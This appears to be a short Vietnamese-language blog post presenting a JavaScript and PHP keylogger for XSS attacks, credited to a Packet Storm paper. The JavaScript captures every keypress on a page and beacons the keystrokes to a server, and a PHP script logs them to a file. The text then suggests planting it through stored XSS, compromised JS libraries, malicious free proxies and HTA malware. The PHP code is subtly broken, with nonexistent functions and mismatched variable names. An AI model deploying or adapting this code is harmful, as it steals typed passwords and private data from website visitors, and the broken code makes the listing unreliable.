---
title: Javascript,PHP Keylogger
date: 30/5/2021
layout: single
header:
  teaser: /assets/images/madoc.jpg
--- 

## Credits: Ismailtasdelen
[https://dl.packetstormsecurity.net/papers/general/xss-keylogger.pdf](https://dl.packetstormsecurity.net/papers/general/xss-keylogger.pdf) 

## Language
[![Language](https://img.shields.io/badge/Lang-javascript-blue.svg)](https://www.javascript.com/)
[![Language](https://img.shields.io/badge/Lang-php-blue.svg)](https://www.php.net/)


## Mã Kiểm Tra 

# Javascript

```js
var buffer = [];
var url = 'http://localhost/?q='

document.onkeypress = function(e) {
    var timestamp = Date.now() | 0;
    var stroke = {
          k: e.key,
          t: timestamp
    };
    buffer.push(stroke);
}

window.SetInterval(function() {
    if (buffer.length > 0) {
          var data = encodeURIComponent(JSON.stringify(buffer));
          new Image().src = url + data;
          buffer = [];
    }
}, 200);
```


# PHP

```php
<?php
if(!empty($_GET['q'])) {
    $logfile = fopen('data.txt', 'a+');
    file_write($log_file, $_GET['q']);
    file_close($log_file);
}
?>

```



# Mô Tả 
## Làm thế nào nó hoạt động?
Trên trình kích hoạt: onkeypress. Phím được nhấn bởi máy khách sẽ được gửi đến máy chủ trên localhost /? Q = (key_here)
Máy chủ sẽ nhận điều này thông qua tập lệnh PHP: Nhận đầu vào từ Q và ghi vào tệp.

Những cải tiến có thể được thực hiện: Ví dụ: triển khai websockets, Ajax, v.v. và gửi dữ liệu trong thời gian thực.

## Tôi có thể sử dụng cái này ở đâu?
XSS được lưu trữ trên các trang web? Thỏa hiệp các thư viện / trang web JS và nhúng JS độc hại.
Chạy proxy miễn phí của riêng bạn và đầu độc người dùng bằng JS độc hại (và bộ nhớ cache) Xem tại link bên dưới 
+ [ https://blog.haschek.at/2013/05/why-free-proxies-are-free-js-infection.html]( https://blog.haschek.at/2013/05/why-free-proxies-are-free-js-infection.html) 
+ [ https://blog.haschek.at/2015-analyzing-443-free-proxies](https://blog.haschek.at/2015-analyzing-443-free-proxies) 

Tạo khối lượng phần mềm độc hại của riêng bạn với HTA: html có thể thực thi, v.v.
Chỉ là một số ý tưởng.

## Chúc May Mắn :D
